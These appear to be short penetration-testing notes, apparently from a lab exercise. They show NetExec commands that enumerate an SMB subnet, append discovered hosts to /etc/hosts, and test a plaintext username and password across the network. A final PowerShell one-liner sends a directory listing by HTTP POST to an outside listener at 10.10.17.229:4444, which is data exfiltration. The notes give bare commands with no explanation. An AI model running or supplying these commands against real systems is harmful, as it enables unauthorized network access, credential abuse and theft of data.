nxc smb 172.16.20.0/24 --generate-hosts-file hosts


cat hosts | tee -a /etc/hosts

nxc smb 172.16.20.0/24 -u josh -p 'Rangers1'


// windows 
powershell -c "$b=(ls)|Out-String;Invoke-WebRequest -Uri 10.10.17.229:4444 -Method Post  -Body @{a=$b}"